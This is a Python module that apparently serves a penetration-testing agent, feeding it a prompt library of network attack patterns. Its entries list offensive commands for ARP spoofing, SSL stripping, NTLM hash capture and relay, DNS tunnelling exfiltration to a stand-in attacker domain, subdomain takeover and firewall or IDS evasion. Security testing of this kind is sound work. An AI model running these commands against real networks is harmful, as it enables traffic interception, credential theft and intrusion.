"""Network security knowledge base.

Deep knowledge about network vulnerabilities:
1. Network protocol attacks
2. Man-in-the-middle techniques
3. DNS exploitation
4. Firewall and IDS evasion
5. Network segmentation testing
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Any

import structlog

logger = structlog.get_logger()


@dataclass
class NetworkPattern:
    """A network security pattern."""
    pattern_id: str = ""
    name: str = ""
    category: str = ""
    severity: str = "high"
    description: str = ""
    detection_strategy: str = ""
    tools: list[str] = field(default_factory=list)

    def to_dict(self) -> dict[str, Any]:
        return {
            "id": self.pattern_id,
            "name": self.name[:25],
            "category": self.category[:12],
        }


NETWORK_PATTERNS: list[dict[str, Any]] = [
    {
        "id": "net-001", "name": "ARP and Layer 2 Attacks",
        "category": "layer2", "severity": "high",
        "desc": "Layer 2 network attack techniques.",
        "detection": (
            "ARP AND LAYER 2 ATTACKS:\n"
            "ARP SPOOFING:\n"
            "  # Intercept traffic between two hosts\n"
            "  arpspoof -i eth0 -t <target> <gateway>\n"
            "  arpspoof -i eth0 -t <gateway> <target>\n"
            "  # Enable IP forwarding\n"
            "  echo 1 > /proc/sys/net/ipv4/ip_forward\n"
            "  # Bettercap (modern alternative)\n"
            "  bettercap -iface eth0\n"
            "  > net.probe on; arp.spoof on; net.sniff on\n"
            "VLAN HOPPING:\n"
            "  - Switch spoofing (DTP negotiation)\n"
            "  - Double tagging (802.1Q-in-802.1Q)\n"
            "  - Requires native VLAN misconfiguration\n"
            "MAC FLOODING:\n"
            "  macof -i eth0  # Flood switch CAM table\n"
            "  # Switch falls back to hub mode (broadcasts all)\n"
            "STP ATTACKS:\n"
            "  # Become root bridge\n"
            "  # yersinia -G  # GUI for L2 attacks\n"
            "  yersinia stp -attack 3 -i eth0  # Root bridge attack\n"
            "DHCP ATTACKS:\n"
            "  # DHCP starvation\n"
            "  # DHCP rogue server\n"
            "  # Redirect DNS/gateway via DHCP"
        ),
        "tools": ["bettercap", "yersinia", "macof"],
    },
    {
        "id": "net-002", "name": "MITM Techniques",
        "category": "mitm", "severity": "critical",
        "desc": "Man-in-the-middle attack techniques.",
        "detection": (
            "MITM TECHNIQUES:\n"
            "ARP-BASED MITM:\n"
            "  bettercap -iface eth0\n"
            "  > set arp.spoof.targets <target>\n"
            "  > arp.spoof on\n"
            "  > net.sniff on\n"
            "SSL STRIPPING:\n"
            "  # Downgrade HTTPS to HTTP\n"
            "  bettercap> set http.proxy.sslstrip true\n"
            "  bettercap> http.proxy on\n"
            "  # Modern defense: HSTS\n"
            "  # Bypass: HSTS bypass via NTP manipulation\n"
            "DNS SPOOFING:\n"
            "  bettercap> set dns.spoof.all true\n"
            "  bettercap> set dns.spoof.domains target.com\n"
            "  bettercap> dns.spoof on\n"
            "LLMNR/NBT-NS POISONING:\n"
            "  # Windows name resolution poisoning\n"
            "  responder -I eth0 -wrf\n"
            "  # Captures NTLMv2 hashes\n"
            "  # Crack: hashcat -m 5600 hashes.txt wordlist.txt\n"
            "  # Relay: ntlmrelayx.py\n"
            "IPv6 MITM:\n"
            "  # RA spoofing (rogue IPv6 router)\n"
            "  mitm6 -d target.com\n"
            "  # Combined with ntlmrelayx\n"
            "  ntlmrelayx.py -6 -t ldaps://dc.target.com"
        ),
        "tools": ["bettercap", "responder", "mitm6"],
    },
    {
        "id": "net-003", "name": "DNS Exploitation",
        "category": "dns", "severity": "high",
        "desc": "DNS-based attack techniques.",
        "detection": (
            "DNS EXPLOITATION:\n"
            "ZONE TRANSFER:\n"
            "  dig axfr target.com @ns1.target.com\n"
            "  # Full zone = all DNS records\n"
            "DNS CACHE POISONING:\n"
            "  - Kaminsky attack\n"
            "  - TXID prediction\n"
            "  - Requires no DNSSEC\n"
            "DNS TUNNELING:\n"
            "  # Exfiltrate data through DNS queries\n"
            "  # Tools: iodine, dnscat2, dns2tcp\n"
            "  iodine -f -P password tunnel.attacker.com\n"
            "  dnscat2-client tunnel.attacker.com\n"
            "DNS REBINDING:\n"
            "  - First resolve to attacker IP\n"
            "  - Second resolve to target internal IP\n"
            "  - Bypass same-origin policy\n"
            "  - Access internal services via browser\n"
            "SUBDOMAIN TAKEOVER:\n"
            "  # CNAME pointing to unclaimed service\n"
            "  dig CNAME target.com\n"
            "  # Check: app.target.com CNAME → deleted.herokuapp.com\n"
            "  # Claim the service = own the subdomain\n"
            "  # Tools: subjack, nuclei\n"
            "  subjack -w subdomains.txt -a -ssl\n"
            "  nuclei -t takeovers/ -l subdomains.txt"
        ),
        "tools": ["dig", "dnscat2", "subjack"],
    },
    {
        "id": "net-004", "name": "Firewall/IDS Evasion",
        "category": "evasion", "severity": "high",
        "desc": "Firewall and IDS/IPS evasion techniques.",
        "detection": (
            "FIREWALL/IDS EVASION:\n"
            "NMAP EVASION:\n"
            "  # Fragment packets\n"
            "  nmap -f -f <target>  # Double fragmentation\n"
            "  # Decoy scanning\n"
            "  nmap -D RND:10 <target>\n"
            "  # Idle/zombie scan\n"
            "  nmap -sI <zombie> <target>\n"
            "  # Source port manipulation\n"
            "  nmap --source-port 53 <target>\n"
            "  # Timing: slow scan\n"
            "  nmap -T0 <target>  # Paranoid (5 min between probes)\n"
            "PROTOCOL EVASION:\n"
            "  - IP fragmentation and reassembly\n"
            "  - TCP segmentation overlap\n"
            "  - TTL manipulation\n"
            "  - Protocol encapsulation (ICMP/DNS tunneling)\n"
            "  - IPv6 tunnel through IPv4\n"
            "PAYLOAD EVASION:\n"
            "  - Encoding: Base64, hex, URL encoding\n"
            "  - Case variation: SeLeCt → SELECT\n"
            "  - Comment insertion: SE/**/LECT\n"
            "  - Unicode normalization\n"
            "  - Chunked transfer encoding\n"
            "WAF BYPASS:\n"
            "  - HTTP method override (X-HTTP-Method-Override)\n"
            "  - Content-Type manipulation\n"
            "  - Parameter pollution\n"
            "  - JSON/XML body instead of form data"
        ),
        "tools": ["nmap"],
    },
    {
        "id": "net-005", "name": "Network Segmentation Testing",
        "category": "segmentation", "severity": "high",
        "desc": "Network segmentation and access control testing.",
        "detection": (
            "NETWORK SEGMENTATION TESTING:\n"
            "VLAN TESTING:\n"
            "  # Check VLAN isolation\n"
            "  # Can hosts in VLAN A reach VLAN B?\n"
            "  nmap -sn <other-vlan-range>\n"
            "  # Check trunk ports\n"
            "  # Look for native VLAN traffic\n"
            "FIREWALL RULES:\n"
            "  # Map allowed ports between segments\n"
            "  nmap -Pn -p- <target-in-other-segment>\n"
            "  # Check for overly permissive rules\n"
            "  # Common issues: ANY-ANY rules, wide port ranges\n"
            "LATERAL MOVEMENT PATHS:\n"
            "  # From compromised host, what can be reached?\n"
            "  # Network sweep\n"
            "  nmap -sn 10.0.0.0/8 --min-rate 1000\n"
            "  # Service discovery\n"
            "  nmap -sV -p 22,80,443,445,3389 <range>\n"
            "  # Common pivoting: SSH tunnel, proxychains\n"
            "  ssh -D 1080 user@pivot  # SOCKS proxy\n"
            "  proxychains nmap <internal-target>\n"
            "MICRO-SEGMENTATION:\n"
            "  - Host-based firewall rules\n"
            "  - Zero-trust network access\n"
            "  - Service mesh policies (Istio, Linkerd)\n"
            "  - Cloud security groups / NSGs"
        ),
        "tools": ["nmap", "proxychains"],
    },
]


class NetworkSecurityKB:
    """Network security knowledge base.

    Provides network vulnerability patterns
    injected into agent prompts.
    """

    def __init__(self) -> None:
        self._patterns: dict[str, NetworkPattern] = {}
        self._log = logger.bind(component="network_security_kb")
        self._load_patterns()

    def _load_patterns(self) -> None:
        """Load network patterns."""
        for data in NETWORK_PATTERNS:
            pattern = NetworkPattern(
                pattern_id=data["id"],
                name=data["name"],
                category=data.get("category", ""),
                severity=data.get("severity", "high"),
                description=data.get("desc", ""),
                detection_strategy=data.get("detection", ""),
                tools=data.get("tools", []),
            )
            self._patterns[pattern.pattern_id] = pattern

    def get_by_category(self, category: str) -> list[NetworkPattern]:
        """Get patterns by category."""
        return [
            p for p in self._patterns.values()
            if p.category.lower() == category.lower()
        ]

    def build_network_prompt(
        self,
        categories: list[str] | None = None,
        max_patterns: int = 4,
    ) -> str:
        """Build network security prompt."""
        lines = ["## Network Security Patterns\n"]
        count = 0
        for pattern in self._patterns.values():
            if categories and pattern.category.lower() not in [c.lower() for c in categories]:
                continue
            if count >= max_patterns:
                break
            lines.append(f"### {pattern.name} [{pattern.category.upper()}]")
            lines.append(pattern.detection_strategy)
            lines.append("")
            count += 1
        return "\n".join(lines)

    def get_stats(self) -> dict[str, Any]:
        cat_counts: dict[str, int] = {}
        for p in self._patterns.values():
            cat_counts[p.category] = cat_counts.get(p.category, 0) + 1
        return {
            "patterns": len(self._patterns),
            "by_category": cat_counts,
        }
